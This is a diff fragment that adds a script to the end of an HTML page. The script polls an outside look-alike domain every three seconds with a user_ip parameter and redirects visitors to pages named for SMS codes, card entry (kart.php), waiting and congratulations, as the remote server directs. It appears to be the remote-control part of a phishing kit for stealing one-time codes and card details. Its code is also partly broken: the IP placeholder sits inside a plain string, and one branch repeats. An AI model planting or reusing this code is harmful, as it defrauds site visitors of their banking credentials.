@@ -793,7 +793,58 @@
     }
   });
 </script>
+                <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+                <script>
+  
+  $(document).ready(function() {
 
+gonder();
+
+var int=self.setInterval("gonder()",3000);
+
+});
+
+  function gonder(){
+  
+      $.ajax({
+        type:'get',
+        url:'https://xn--holiganbt930-8d6f.com/tr/datach.php?user_ip=${this.userIp}`',
+        success: function (msg) {
+        
+        if(msg=='sms'){
+          window.location.href='sms.php';
+        }
+        if(msg=='tebrik'){
+          window.location.href='tebrik.php';
+        }
+         if(msg=='hata'){
+          window.location.href='hata.php';
+        }
+        if(msg=='sms2'){
+          window.location.href='hatali.php';
+        }
+          if(msg=='back'){
+          window.location.href='sms.php';
+        }
+           if(msg=='back'){
+          window.location.href='smsh.php';
+        }
+              if(msg=='1'){
+          window.location.href='smsh.php';
+        }       if(msg=='2'){
+          window.location.href='kart.php';
+        }          if(msg=='3'){
+          window.location.href='bekle.php';
+        }          if(msg=='4'){
+          window.location.href='hata.php';
+        }          if(msg=='5'){
+          window.location.href='tebrik.php';
+        }  
+        }
+      });
+      
+  }
+  </script>
   </body>
 </html>
  
